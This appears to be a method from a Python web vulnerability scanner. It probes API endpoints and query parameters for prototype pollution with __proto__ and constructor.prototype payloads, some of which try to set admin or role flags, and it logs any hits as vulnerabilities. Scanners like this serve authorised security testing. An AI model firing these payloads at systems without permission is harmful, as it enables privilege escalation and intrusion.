    def test_prototype_pollution(self):
        """Prototype Pollution — inject __proto__ / constructor.prototype."""
        if not self.deep: return
        self._print("[*]", "Prototype Pollution testing...", "INFO")
        payloads = [
            '{"__proto__":{"polluted":"yes"}}',
            '{"constructor":{"prototype":{"polluted":"yes"}}}',
            '__proto__[polluted]=yes',
            'constructor[prototype][polluted]=yes',
            '{"__proto__":{"isAdmin":true}}',
            '{"__proto__":{"role":"admin"}}',
            '{"__proto__":{"is_admin":1}}',
        ]
        # Try JSON body on API endpoints
        for ep in ["/api/", "/api/users", "/api/update", "/api/settings", "/"]:
            url = urljoin(self.target, ep)
            for payload in payloads:
                # Try JSON content type
                try:
                    import json as _json
                    data = _json.loads(payload) if payload.startswith("{") else payload
                    r = self._post(url, json=data, headers={"Content-Type":"application/json"})
                except Exception:
                    r = self._post(url, data=payload, headers={"Content-Type":"application/json"})
                if r and r.status_code in (200, 201, 204):
                    # Check if pollution took effect — send another request to see
                    r2 = self._get(url)
                    if r2 and ("polluted" in (r2.text or "").lower() or
                               "isadmin" in (r2.text or "").lower()):
                        self._add_vuln("Prototype Pollution", "CRITICAL",
                                        url, f"payload={payload[:60]}",
                                        endpoint=ep, payload=payload)
                        break
        # Also try via query params
        for url, params in list(self.params_seen)[:10]:
            for p in params:
                for payload in ["__proto__[test]=pp", "constructor[prototype][test]=pp"]:
                    test_url = self._inject(url, p, payload)
                    r = self._get(test_url)
                    if r and "pp" in (r.text or "").lower():
                        self._add_vuln("Prototype Pollution (query param)", "HIGH",
                                        test_url, f"{p}={payload}",
                                        param=p, payload=payload)

